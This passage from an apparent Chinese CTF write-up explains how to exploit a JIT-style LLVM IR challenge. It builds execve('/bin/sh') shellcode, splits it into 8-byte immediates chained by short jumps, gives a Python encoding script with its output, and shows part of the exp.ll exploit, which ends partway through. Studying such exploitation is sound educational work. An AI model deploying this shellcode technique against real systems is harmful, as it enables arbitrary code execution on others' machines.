<p>我们直接使用pwntools中给出的模板，在其基础上进行修改。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class="line">/* push b&#x27;/bin///sh\x00&#x27; */</span><br><span class="line">push 0x68</span><br><span class="line">mov rax, 0x732f2f2f6e69622f</span><br><span class="line">push rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">/* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">/* push b&#x27;sh\x00&#x27; */</span><br><span class="line">push 0x1010101 ^ 0x6873</span><br><span class="line">xor dword ptr [rsp], 0x1010101</span><br><span class="line">xor esi, esi /* 0 */</span><br><span class="line">push rsi /* null terminate */</span><br><span class="line">push 8</span><br><span class="line">pop rsi</span><br><span class="line">add rsi, rsp</span><br><span class="line">push rsi /* &#x27;sh\x00&#x27; */</span><br><span class="line">mov rsi, rsp</span><br><span class="line">xor edx, edx /* 0 */</span><br><span class="line">/* call execve() */</span><br><span class="line">push SYS_execve /* 0x3b */</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<ol>
<li><code>push 0x68</code>：机器码<code>jh</code>，占用2字节。</li>
<li><code>mov rax, 0x732f2f2f6e69622f</code>：占用10字节，进行改写：<br />
(1) <code>mov eax, 0x732f2f2f</code>：机器码<code>\xb8///s</code>，占用5字节。<br />
(2) <code>shl rax, 32</code>：机器码<code>H\xc1\xe0&lt;space&gt;</code>，占用4字节（&lt;space&gt;指空格）。<br />
(3) <code>add rax, 0x6e69622f</code>：机器码<code>H\x05/bin</code>，占用6字节。</li>
<li><code>push rax</code>：机器码<code>P</code>，占用1字节。</li>
<li><code>mov rdi, rsp</code>：机器码<code>H\x89\xe7</code>，占用3字节。</li>
<li><code>push 0x1010101 ^ 0x6873</code>：机器码<code>hri\x01\x01</code>，但其与下一步可以合并：<br />
<code>push 0x6873</code>：机器码<code>hsh\x00\x00</code>，占用5字节。</li>
<li><code>xor esi, esi</code>：机器码<code>1\xf6</code>，占用2字节。</li>
<li><code>push rsi</code>：机器码<code>V</code>，占用1字节。</li>
<li><code>push 8</code>：机器码<code>j\x08</code>，占用2字节。</li>
<li><code>pop rsi</code>：机器码<code>^</code>，占用1字节。</li>
<li><code>add rsi, rsp</code>：机器码<code>H\x01\xe6</code>，占用3字节。</li>
<li><code>push rsi</code>：机器码<code>V</code>，占用1字节。</li>
<li><code>mov rsi, rsp</code>：机器码<code>H\x89\xe6</code>，占用3字节。</li>
<li><code>xor edx, edx</code>：机器码<code>1\xd2</code>，占用2字节。</li>
<li><code>push SYS_execve</code>：机器码<code>j;</code>，占用2字节。</li>
<li><code>pop rax</code>：机器码<code>X</code>，占用1字节。</li>
<li><code>syscall</code>：机器码<code>\x0f\x05</code>，占用2字节。</li>
</ol>
<p>机器码分析完毕。我们发现有一些指令很短，可以几条合并。如3和4合并、6和7和8和9合并、10和11合并、12和13合并、14和15和16合并。但是为了批量生成指令机器码的方便，每个8字节中只填充一个shellcode指令。我们让短转移指令固定在最后2字节，前面的指令不够6字节的使用nop指令补充。我们使用脚本尝试生成一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = [</span><br><span class="line">			 <span class="string">&quot;push 0x68&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;mov eax, 0x732f2f2f&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;shl rax, 32&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;add rax, 0x6e69622f&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;push rax&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;mov rdi, rsp&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;push 0x6873&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;xor esi, esi&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;push rsi&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;push 8&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;pop rsi&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;add rsi, rsp&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;push rsi&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;mov rsi, rsp&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;xor edx, edx&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;push SYS_execve&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;pop rax&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;syscall&quot;</span></span><br><span class="line">	     	]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> code <span class="keyword">in</span> shellcode:</span><br><span class="line">	<span class="built_in">bytes</span> = asm(code).ljust(<span class="number">6</span>, <span class="string">b&#x27;\x90&#x27;</span>) + <span class="string">b&#x27;\xEB\xE9&#x27;</span>	<span class="comment"># \xEB\xEB: jmp short ptr -21, 思考一下-21这个数是怎么得出来的</span></span><br><span class="line">	<span class="built_in">print</span>(u64(<span class="built_in">bytes</span>))</span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">16999840169015142506</span><br><span class="line">16999840042827329464</span><br><span class="line">16999840167141359944</span><br><span class="line">16999802617337939272</span><br><span class="line">16999840169015152720</span><br><span class="line">16999840169020852552</span><br><span class="line">16999839548121314152</span><br><span class="line">16999840169015178801</span><br><span class="line">16999840169015152726</span><br><span class="line">16999840169015117930</span><br><span class="line">16999840169015152734</span><br><span class="line">16999840169020752200</span><br><span class="line">16999840169015152726</span><br><span class="line">16999840169020787016</span><br><span class="line">16999840169015169585</span><br><span class="line">16999840169015130986</span><br><span class="line">16999840169015152728</span><br><span class="line">16999840169015117071</span><br></pre></td></tr></table></figure>
<p>接下来，我们要进行调试，构造出能够产生jmp指令两个长函数以供handle函数解析。</p>
<h2 id="step-7-getshell"><a class="markdownIt-Anchor" href="#step-7-getshell"></a> Step 7: getshell</h2>
<p>我们在一个函数中写入很多的add指令，就像下面这样。经过测试得出=，当写到%315时，有一个movabs指令能够成功溢出到0xFF0之后，不过这是第一条指令。因此我们写shellcode应该写在前面几个指令中。<br />
<img src="15.png" alt="" /><br />
下面是解析第一个函数后最后几个字节的情况：<br />
<img src="16.png" alt="" /><br />
下面是解析第二个函数后最后几个字节的情况：<br />
<img src="17.png" alt="" /><br />
由下图可以得出，我们可以控制的是第一个函数最后一个movabs中最后的4个字节：<br />
<img src="18.png" alt="" /><br />
根据下图可知，第一个短转移（即图中的jmp）偏移应该为：<code>-(0xff3-(0xfde+2))=-0x13=0xed</code><br />
<img src="19.png" alt="" /><br />
如图所示，这样就可以跳转到我们的第一个shellcode了。第一个立即数的值应该为<code>0xEDEB00000000</code>。（低4字节无所谓）<br />
<img src="20.png" alt="" /><br />
然后我们只要将上面脚本中的值依次写入到下面即可。<br />
<img src="21.png" alt="" /><br />
成功getshell。<br />
<img src="22.png" alt="" /><br />
exp.ll如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;test.c&#x27;</span><br><span class="line">source_filename = &quot;test.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i64 @test(i64 %0) #0 &#123;</span><br><span class="line">  %2 = add nsw i64 %0, 261593573097472</span><br><span class="line">  %3 = add nsw i64 %2, 256</span><br><span class="line">  %4 = add nsw i64 %3, 256</span><br><span class="line">  %5 = add nsw i64 %4, 256</span><br><span class="line">  %6 = add nsw i64 %5, 256</span><br><span class="line">  %7 = add nsw i64 %6, 256</span><br><span class="line">  %8 = add nsw i64 %7, 256</span><br><span class="line">  %9 = add nsw i64 %8, 256</span><br><span class="line">  %10 = add nsw i64 %9, 256</span><br><span class="line">  %11 = add nsw i64 %10, 256</span><br><span class="line">  %12 = add nsw i64 %11, 256</span><br><span class="line">  %13 = add nsw i64 %12, 256</span><br><span class="line">  %14 = add nsw i64 %13, 256</span><br><span class="line">  %15 = add nsw i64 %14, 256</span><br><span class="line">  %16 = add nsw i64 %15, 256</span><br><span class="line">  %17 = add nsw i64 %16, 256</span><br><span class="line">  %18 = add nsw i64 %17, 256</span><br><span class="line">  %19 = add nsw i64 %18, 256</span><br><span class="line">  %20 = add nsw i64 %19, 256</span><br><span class="line">  %21 = add nsw i64 %20, 256</span><br><span class="line">  %22 = add nsw i64 %21, 256</span><br><span class="line">  %23 = add nsw i64 %22, 256</span><br><span class="line">  %24 = add nsw i64 %23, 256</span><br><span class="line">  %25 = add nsw i64 %24, 256</span><br><span class="line">  %26 = add nsw i64 %25, 256</span><br><span class="line">  %27 = add nsw i64 %26, 256</span><br><span class="line">  %28 = add nsw i64 %27, 256</span><br><span class="line">  %29 = add nsw i64 %28, 256</span><br><span class="line">  %30 = add nsw i64 %29, 256</span><br><span class="line">  %31 = add nsw i64 %30, 256</span><br><span class="line">  %32 = add nsw i64 %31, 256</span><br><span class="line">  %33 = add nsw i64 %32, 256</span><br><span class="line">  %34 = add nsw i64 %33, 256</span><br><span class="line">  %35 = add nsw i64 %34, 256</span><br><span class="line">  %36 = add nsw i64 %35, 256</span><br><span class="line">  %37 = add nsw i64 %36, 256</span><br><span class="line">  %38 = add nsw i64 %37, 256</span><br><span class="line">  %39 = add nsw i64 %38, 256</span><br><span class="line">  %40 = add nsw i64 %39, 256</span><br><span class="line">  %41 = add nsw i64 %40, 256</span><br><span class="line">  %42 = add nsw i64 %41, 256</span><br><span class="line">  %43 = add nsw i64 %42, 256</span><br><span class="line">  %44 = add nsw i64 %43, 256</span><br><span class="line">  %45 = add nsw i64 %44, 256</span><br><span class="line">  %46 = add nsw i64 %45, 256</span><br><span class="line">  %47 = add nsw i64 %46, 256</span><br><span class="line">  %48 = add nsw i64 %47, 256</span><br><span class="line">  %49 = add nsw i64 %48, 256</span><br><span class="line">  %50 = add nsw i64 %49, 256</span><br><span class="line">  %51 = add nsw i64 %50, 256</span><br><span class="line">  %52 = add nsw i64 %51, 256</span><br><span class="line">  %53 = add nsw i64 %52, 256</span><br><span class="line">  %54 = add nsw i64 %53, 256</span><br><span class="line">  %55 = add nsw i64 %54, 256</span><br><span class="line">  %56 = add nsw i64 %55, 256</span><br><span class="line">  %57 = add nsw i64 %56, 256</span><br><span class="line">  %58 = add nsw i64 %57, 256</span><br><span class="line">  %59 = add nsw i64 %58, 256</span><br><span class="line">  %60 = add nsw i64 %59, 256</span><br><span class="line">  %61 = add nsw i64 %60, 256</span><br><span class="line">  %62 = add nsw i64 %61, 256</span><br><span class="line">  %63 = add nsw i64 %62, 256</span><br><span class="line">  %64 = add nsw i64 %63, 256</span><br><span class="line">  %65 = add nsw i64 %64, 256</span><br><span class="line">  %66 = add nsw i64 %65, 256</span><br><span class="line">  %67 = add nsw i64 %66, 256</span><br><span class="line">  %68 = add nsw i64 %67, 256</span><br><span class="line">  %69 = add nsw i64 %68, 256</span><br><span class="line">  %70 = add nsw i64 %69, 256</span><br><span class="line">  %71 = add nsw i64 %70, 256</span><br><span class="line">  %72 = add nsw i64 %71, 256</span><br><span class="line">  %73 = add nsw i64 %72, 256</span><br><span class="line">  %74 = add nsw i64 %73, 256</span><br><span class="line">  %75 = add nsw i64 %74, 256</span><br><span class="line">  %76 = add nsw i64 %75, 256</span><br><span class="line">  %77 = add nsw i64 %76, 256</span><br><span class="line">  %78 = add nsw i64 %77, 256</span><br><span class="line">  %79 = add nsw i64 %78, 256</span><br><span class="line">  %80 = add nsw i64 %79, 256</span><br><span class="line">  %81 = add nsw i64 %80, 256</span><br><span class="line">  %82 = add nsw i64 %81, 256</span><br><span class="line">  %83 = add nsw i64 %82, 256</span><br><span class="line">  %84 = add nsw i64 %83, 256</span><br><span class="line">  %85 = add nsw i64 %84, 256</span><br><span class="line">  %86 = add nsw i64 %85, 256</span><br><span class="line">  %87 = add nsw i64 %86, 256</span><br><span class="line">  %88 = add nsw i64 %87, 256</span><br><span class="line">  %89 = add nsw i64 %88, 256</span><br><span class="line">  %90 = add nsw i64 %89, 256</span><br><span class="line">  %91 = add nsw i64 %90, 256</span><br><span class="line">  %92 = add nsw i64 %91, 256</span><br><span class="line">  %93 = add nsw i64 %92, 256</span><br><span class="line">  %94 = add nsw i64 %93, 256</span><br><span class="line">  %95 = add nsw i64 %94, 256</span><br><span class="line">  %96 = add nsw i64 %95, 256</span><br><span class="line">  %97 = add nsw i64 %96, 256</span><br><span class="line">  %98 = add nsw i64 %97, 256</span><br><span class="line">  %99 = add nsw i64 %98, 256</span><br><span class="line">  %100 = add nsw i64 %99, 256</span><br><span class="line">  %101 = add nsw i64 %100, 256</span><br><span class="line">  %102 = add nsw i64 %101, 256</span><br><span class="line">  %103 = add nsw i64 %102, 256</span><br><span class="line">  %104 = add nsw i64 %103, 256</span><br><span class="line">  %105 = add nsw i64 %104, 256</span><br><span class="line">  %106 = add nsw i64 %105, 256</span><br><span class="line">  %107 = add nsw i64 %106, 256</span><br><span class="line">  %108 = add nsw i64 %107, 256</span><br><span class="line">  %109 = add nsw i64 %108, 256</span><br><span class="line">  %110 = add nsw i64 %109, 256</span><br><span class="line">  %111 = add nsw i64 %110, 256</span><br><span class="line">  %112 = add nsw i64 %111, 256</span><br><span class="line">  %113 = add nsw i64 %112, 256</span><br><span class="line">  %114 = add nsw i64 %113, 256</span><br><span class="line">  %115 